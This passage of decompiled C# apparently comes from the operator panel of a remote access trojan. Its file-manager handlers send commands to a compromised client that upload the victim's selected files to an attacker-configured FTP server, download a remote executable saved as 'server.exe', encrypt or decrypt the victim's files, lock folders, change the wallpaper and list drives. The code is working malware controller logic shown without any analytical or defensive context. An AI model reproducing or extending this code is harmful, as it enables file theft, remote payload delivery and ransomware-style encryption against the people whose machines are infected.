			closure_0024__R292_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R292_002D._Lambda_0024__R66, array);
		}
	}

	private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Ftphost", null));
		string text2 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Ftpuser", null));
		string text3 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Ftppass", null));
		string text4 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Ftpport", null));
		string text5 = null;
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			text5 = text5 + "-=>" + Guna2TextBox1.Text + selectedItem.Text;
		}
		byte[] array = Module0.smethod_6("UPtoFtp" + GClass19.string_0 + text2 + GClass19.string_0 + text3 + GClass19.string_0 + text + GClass19.string_0 + text4 + GClass19.string_0 + text5);
		_Closure_0024__R293_002D66 arg = default(_Closure_0024__R293_002D66);
		_Closure_0024__R293_002D66 CS_0024_003C_003E8__locals0 = new _Closure_0024__R293_002D66(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2 = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2.method_1((byte[])a0);
		}, array);
	}

	private void SettingsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		Ftp ftp = new Ftp();
		ftp.StartPosition = FormStartPosition.CenterParent;
		ftp.ShowDialog();
	}

	private void SendFromLinkToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		string defaultResponse = "http://www.example.com/File.exe";
		string text = Interaction.InputBox("Set The Url", "From Url", defaultResponse);
		string defaultResponse2 = "server.exe";
		string text2 = Interaction.InputBox("Set The File Name", "File Name", defaultResponse2);
		if (!((text.Length == 0) | (text2.Length == 0)))
		{
			byte[] array = Module0.smethod_6("FURL" + GClass19.string_0 + text + GClass19.string_0 + Guna2TextBox1.Text + text2);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void SetBackgroundToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("ChangeWL" + GClass19.string_0 + Guna2TextBox1.Text + ListView1.FocusedItem.Text);
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void PlayToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("RSS" + GClass19.string_0 + Guna2TextBox1.Text + ListView1.FocusedItem.Text);
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("RSSDis");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Guna2TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			method_1();
		}
	}

	private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = null;
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			text = text + "-=>" + Guna2TextBox1.Text + selectedItem.Text;
		}
		byte[] array = Module0.smethod_6("ENC" + GClass19.string_0 + text);
		_Closure_0024__R300_002D76 arg = default(_Closure_0024__R300_002D76);
		_Closure_0024__R300_002D76 CS_0024_003C_003E8__locals0 = new _Closure_0024__R300_002D76(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2 = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2.method_1((byte[])a0);
		}, array);
	}

	private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = null;
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			text = text + "-=>" + Guna2TextBox1.Text + selectedItem.Text;
		}
		byte[] array = Module0.smethod_6("DEC" + GClass19.string_0 + text);
		_Closure_0024__R301_002D78 arg = default(_Closure_0024__R301_002D78);
		_Closure_0024__R301_002D78 CS_0024_003C_003E8__locals0 = new _Closure_0024__R301_002D78(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2 = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2.method_1((byte[])a0);
		}, array);
	}

	private void LockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		_Closure_0024__R302_002D80 closure_0024__R302_002D = default(_Closure_0024__R302_002D80);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("LockDir" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
			closure_0024__R302_002D = new _Closure_0024__R302_002D80(closure_0024__R302_002D);
			closure_0024__R302_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R302_002D._Lambda_0024__R82, array);
		}
	}

	private void UnlockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		_Closure_0024__R303_002D82 closure_0024__R303_002D = default(_Closure_0024__R303_002D82);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("UnlockDir" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
			closure_0024__R303_002D = new _Closure_0024__R303_002D82(closure_0024__R303_002D);
			closure_0024__R303_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R303_002D._Lambda_0024__R84, array);
		}
	}

	private void DownloadFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder", string_0);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton4_Click(object sender, EventArgs e)
	{
		try
		{
			if (Guna2TextBox1.Text.Length < 4)
			{
				Guna2TextBox1.Text = "";
				byte[] array = Module0.smethod_6("GetDrives" + GClass19.string_0);
				GClass5 gClass = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass.method_1((byte[])a0);
				}, array);
			}
			else
			{
				Guna2TextBox1.Text = Guna2TextBox1.Text.Substring(0, Guna2TextBox1.Text.LastIndexOf("\\"));
				Guna2TextBox1.Text = Guna2TextBox1.Text.Substring(0, checked(Guna2TextBox1.Text.LastIndexOf("\\") + 1));
				method_1();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2TextBox2_TextChanged(object sender, EventArgs e)
	{
		try
		{
			method_0(Guna2TextBox2.Text, ListView1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2TextBox2_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (Operators.CompareString(Conversions.ToString(e.KeyChar), "\b", TextCompare: false) != 0 || Guna2TextBox2.Text.Length != 1)
		{
			return;
		}
		try
		{
			try
			{
				if (Operators.CompareString(Guna2TextBox1.Text, "", TextCompare: false) != 0)
				{
					byte[] array = Module0.smethod_6("FileManager" + GClass19.string_0 + Guna2TextBox1.Text);
					GClass5 gClass = gclass5_0;
					ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
					{
						gClass.method_1((byte[])a0);
					}, array);
				}
				else
				{
					byte[] array2 = Module0.smethod_6("GetDrives");
					GClass5 gClass2 = gclass5_0;
					ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
					{
						gClass2.method_1((byte[])a0);
					}, array2);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FileHashToolStripMenuItem_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("Hash" + GClass19.string_0 + Guna2TextBox1.Text + ListView1.FocusedItem.Text);
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}
}